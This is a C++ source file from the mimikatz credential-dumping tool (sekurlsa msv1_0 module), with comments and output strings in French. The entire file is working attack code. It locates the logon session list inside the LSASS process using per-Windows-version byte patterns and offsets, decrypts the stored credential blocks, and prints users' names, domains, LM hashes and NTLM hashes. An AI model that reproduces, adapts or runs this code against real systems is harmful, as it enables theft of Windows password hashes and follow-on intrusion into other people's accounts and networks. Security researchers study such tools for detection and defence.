/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "msv1_0.h"
#include "..\..\global.h"
PLIST_ENTRY mod_mimikatz_sekurlsa_msv1_0::LogonSessionList = NULL;
PULONG mod_mimikatz_sekurlsa_msv1_0::LogonSessionListCount = NULL;

bool mod_mimikatz_sekurlsa_msv1_0::getMSV(vector<wstring> * arguments)
{
	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(getMSVLogonData, wstring(L"msv1_0")));
	return mod_mimikatz_sekurlsa::getLogonData(arguments, &monProvider);
}

bool mod_mimikatz_sekurlsa_msv1_0::searchLogonSessionList()
{
#ifdef _M_X64
	BYTE PTRN_WIN6_LogonSessionList[]		= {0x4C, 0x03, 0xD8, 0x49, 0x8B, 0x03, 0x48, 0x89};//, 0x06, 0x4C, 0x89, 0x5E};
	BYTE PTRN_WIN5_LogonSessionList[]		= {0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8};
	
	LONG OFFS_WALL_LogonSessionList			= -sizeof(long);
	LONG OFFS_WN60_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 4 + 3 + 6 + 3 + 2 + 8 + 7 + 4 + 4 + 2 + 3 + 3 + sizeof(long));
	LONG OFFS_WN61_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 4 + 3 + 6 + 3 + 2 + 8 + 7 + 4 + 4 + 2 + 3 + 2 + sizeof(long));
	LONG OFFS_WIN5_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 6 + 3 + 8 + 4 + 4 + 2 + 3 + 2 + 2 + sizeof(long));
	LONG OFFS_WIN8_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 4 + 3 + 6 + 3 + 2 + 3 + 7 + 7 + 4 + 4 + 2 + 3 + 2 + sizeof(long));
#elif defined _M_IX86
	BYTE PTRN_WNO8_LogonSessionList[]		= {0x89, 0x71, 0x04, 0x89, 0x30, 0x8D, 0x04, 0xBD};
	BYTE PTRN_WIN8_LogonSessionList[]		= {0x89, 0x79, 0x04, 0x89, 0x38, 0x8D, 0x04, 0xB5};
	BYTE PTRN_WN51_LogonSessionList[]		= {0xFF, 0x50, 0x10, 0x85, 0xC0, 0x0F, 0x84};

	LONG OFFS_WNO8_LogonSessionList			= -(7 + (sizeof(LONG)));
	LONG OFFS_WIN8_LogonSessionList			= -(6 + 3 + 3 + 2 + 2 + (sizeof(LONG)));
	LONG OFFS_WN51_LogonSessionList			= sizeof(PTRN_WN51_LogonSessionList) + 4 + 5 + 1 + 6 + 1;
	LONG OFFS_WNO8_LogonSessionListCount	= OFFS_WNO8_LogonSessionList - (3 + 6 + 1 + 2 + 6 + 3 + 2 + 3 + 1 + sizeof(long));
	LONG OFFS_WIN5_LogonSessionListCount	= OFFS_WNO8_LogonSessionList - (3 + 6 + 1 + 2 + 6 + 3 + 2 + 1 + 3 + 1 + sizeof(long));
	LONG OFFS_WIN8_LogonSessionListCount	= OFFS_WIN8_LogonSessionList - (3 + 6 + 1 + 2 + 6 + 3 + 2 + 3 + 1 + sizeof(long));
#endif
	if(mod_mimikatz_sekurlsa::searchLSASSDatas() && mod_mimikatz_sekurlsa::hLsaSrv && mod_mimikatz_sekurlsa::pModLSASRV && !LogonSessionList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offsetListe = 0, offsetCount = 0;
#ifdef _M_X64
		offsetListe	= OFFS_WALL_LogonSessionList;
		if(mod_system::GLOB_Version.dwMajorVersion < 6)
		{
			pattern	= PTRN_WIN5_LogonSessionList;
			taille	= sizeof(PTRN_WIN5_LogonSessionList);
			offsetCount = OFFS_WIN5_LogonSessionListCount;
		}
		else
		{
			pattern	= PTRN_WIN6_LogonSessionList;
			taille	= sizeof(PTRN_WIN6_LogonSessionList);
			if(mod_system::GLOB_Version.dwBuildNumber < 8000)
				offsetCount = (mod_system::GLOB_Version.dwMinorVersion < 1) ? OFFS_WN60_LogonSessionListCount : OFFS_WN61_LogonSessionListCount;
			else
				offsetCount = OFFS_WIN8_LogonSessionListCount;
		}
#elif defined _M_IX86
		if(mod_system::GLOB_Version.dwBuildNumber < 8000)
		{
			if((mod_system::GLOB_Version.dwMajorVersion == 5) && (mod_system::GLOB_Version.dwMinorVersion == 1))
			{
				pattern	= PTRN_WN51_LogonSessionList;
				taille	= sizeof(PTRN_WN51_LogonSessionList);
				offsetListe	= OFFS_WN51_LogonSessionList;
			}
			else
			{
				pattern	= PTRN_WNO8_LogonSessionList;
				taille	= sizeof(PTRN_WNO8_LogonSessionList);
				offsetListe	= OFFS_WNO8_LogonSessionList;
				offsetCount = (mod_system::GLOB_Version.dwMajorVersion < 6) ? OFFS_WIN5_LogonSessionListCount : OFFS_WNO8_LogonSessionListCount;
			}
		}
		else
		{
			pattern	= PTRN_WIN8_LogonSessionList;
			taille	= sizeof(PTRN_WIN8_LogonSessionList);
			offsetListe	= OFFS_WIN8_LogonSessionList;
			offsetCount = OFFS_WIN8_LogonSessionListCount;
		}
#endif
		MODULEINFO mesInfos;
		if(GetModuleInformation(GetCurrentProcess(), mod_mimikatz_sekurlsa::hLsaSrv, &mesInfos, sizeof(MODULEINFO)))
		{
			pointeur = reinterpret_cast<PBYTE *>(&LogonSessionList);
			if(mod_memory::genericPatternSearch(pointeur, L"lsasrv", pattern, taille, offsetListe))
			{
				*pointeur += mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
				if(offsetCount)
				{
					pointeur = reinterpret_cast<PBYTE *>(&LogonSessionListCount);
					if(mod_memory::genericPatternSearch(pointeur, L"lsasrv", pattern, taille, offsetCount))
						*pointeur += mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
				}
			}
		}
	}
	return (mod_mimikatz_sekurlsa::hLsaSrv && mod_mimikatz_sekurlsa::pModLSASRV && LogonSessionList && (((mod_system::GLOB_Version.dwMajorVersion == 5) && (mod_system::GLOB_Version.dwMinorVersion == 1)) || LogonSessionListCount));
}

bool WINAPI mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData(__in PLUID logId, __in bool justSecurity)
{
	if(searchLogonSessionList())
	{
		LONG offsetToLuid, offsetToCredentials;
		if(mod_system::GLOB_Version.dwMajorVersion < 6)
		{
			offsetToLuid = FIELD_OFFSET(KIWI_MSV1_0_LIST_5, LocallyUniqueIdentifier);
			offsetToCredentials = FIELD_OFFSET(KIWI_MSV1_0_LIST_5, Credentials);
		}
		else
		{
			offsetToLuid = FIELD_OFFSET(KIWI_MSV1_0_LIST_6, LocallyUniqueIdentifier);
			offsetToCredentials = FIELD_OFFSET(KIWI_MSV1_0_LIST_6, Credentials);
			if(mod_system::GLOB_Version.dwBuildNumber >= 8000)	 // pas encore pris le temps de regarder les structures de 8
			{
#ifdef _M_X64
				offsetToCredentials += 4*sizeof(PVOID);
#elif defined _M_IX86
				offsetToCredentials += 2*sizeof(PVOID);
#endif
			}
		}
		
		ULONG nbListes = 0;
		if(LogonSessionListCount)
			mod_memory::readMemory(LogonSessionListCount, &nbListes, sizeof(nbListes), mod_mimikatz_sekurlsa::hLSASS);
		else nbListes = 1;

		PLIST_ENTRY pLogSession = NULL;
		for(ULONG i = 0; i < nbListes; i++)
		{
			if(pLogSession = mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(LogonSessionList + i), offsetToLuid, logId))
			{
				BYTE * kiwiMSVListEntry = new BYTE[offsetToCredentials + sizeof(PVOID)];
				if(mod_memory::readMemory(pLogSession, kiwiMSVListEntry, offsetToCredentials + sizeof(PVOID), mod_mimikatz_sekurlsa::hLSASS))
				{
					PVOID monPtr = *reinterpret_cast<PVOID *>(kiwiMSVListEntry + offsetToCredentials);
					if(monPtr)
					{
						BYTE * kiwiMSVCredentials = new BYTE[sizeof(KIWI_MSV1_0_CREDENTIALS)];
						if(mod_memory::readMemory(monPtr, kiwiMSVCredentials, sizeof(KIWI_MSV1_0_CREDENTIALS), mod_mimikatz_sekurlsa::hLSASS))
						{
							PKIWI_MSV1_0_CREDENTIALS mesCreds = reinterpret_cast<PKIWI_MSV1_0_CREDENTIALS>(kiwiMSVCredentials);
							if(mesCreds->PrimaryCredentials)
							{
								BYTE * kiwiMSVPrimaryCredentials = new BYTE[sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)];
								if(mod_memory::readMemory(mesCreds->PrimaryCredentials, kiwiMSVPrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), mod_mimikatz_sekurlsa::hLSASS))
								{
									decryptAndDisplayCredsBlock(&reinterpret_cast<PKIWI_MSV1_0_PRIMARY_CREDENTIALS>(kiwiMSVPrimaryCredentials)->Credentials, justSecurity);
								} else (*outputStream) << L"n.e. (Lecture KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)";
								delete [] kiwiMSVPrimaryCredentials;

							} else (*outputStream) << L"n.s. (PrimaryCredentials KO)";

						}else (*outputStream) << L"n.e. (Lecture KIWI_MSV1_0_CREDENTIALS KO)";
						delete [] kiwiMSVCredentials;

					} else (*outputStream) << L"n.s. (Credentials KO)";

				} else (*outputStream) << L"n.e. (Lecture KIWI_MSV1_0_LIST KO)";
				delete [] kiwiMSVListEntry;

				break;
			}
		}
		if(!pLogSession)
			(*outputStream) << L"n.t. (LUID KO)";
	}
	else (*outputStream) << L"n.a. (msv1_0 KO)";
	return true;
}

bool mod_mimikatz_sekurlsa_msv1_0::decryptAndDisplayCredsBlock(LSA_UNICODE_STRING * monBlock, bool justSecurity)
{
	if(monBlock->Length > 0 && monBlock->MaximumLength > 0 && monBlock->Buffer)
	{
		BYTE * monBuffer = new BYTE[monBlock->MaximumLength];
		if(mod_memory::readMemory(monBlock->Buffer, monBuffer, monBlock->MaximumLength, mod_mimikatz_sekurlsa::hLSASS))
		{
			mod_mimikatz_sekurlsa::SeckPkgFunctionTable->LsaUnprotectMemory(monBuffer, monBlock->Length);
			PMSV1_0_PRIMARY_CREDENTIAL mesCreds = reinterpret_cast<PMSV1_0_PRIMARY_CREDENTIAL>(monBuffer);
			
			NlpMakeRelativeOrAbsoluteString(mesCreds, &mesCreds->UserName, false);
			NlpMakeRelativeOrAbsoluteString(mesCreds, &mesCreds->LogonDomainName, false);

			wstring lmHash = mod_text::stringOfHex(mesCreds->LmOwfPassword, sizeof(mesCreds->LmOwfPassword));
			wstring ntHash = mod_text::stringOfHex(mesCreds->NtOwfPassword, sizeof(mesCreds->NtOwfPassword));

			if(justSecurity)
				(*outputStream) << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
			else
			{
				(*outputStream) << endl <<
					L"\t * Utilisateur  : " << mod_text::stringOfSTRING(mesCreds->UserName) << endl <<
					L"\t * Domaine      : " << mod_text::stringOfSTRING(mesCreds->LogonDomainName) << endl <<
					L"\t * Hash LM      : " << lmHash << endl <<
					L"\t * Hash NTLM    : " << ntHash;
			}
		} else (*outputStream) << L"n.e. (Lecture Block Credentials KO)";

		delete [] monBuffer;
	} else (*outputStream) << L"n.s. (Block Credentials KO)";

	return true;
}

void mod_mimikatz_sekurlsa_msv1_0::NlpMakeRelativeOrAbsoluteString(PVOID BaseAddress, PLSA_UNICODE_STRING String, bool relative)
{
	if(String->Buffer)
		String->Buffer = reinterpret_cast<wchar_t *>(reinterpret_cast<ULONG_PTR>(String->Buffer) + ((relative ? -1 : 1) * reinterpret_cast<ULONG_PTR>(BaseAddress)));
}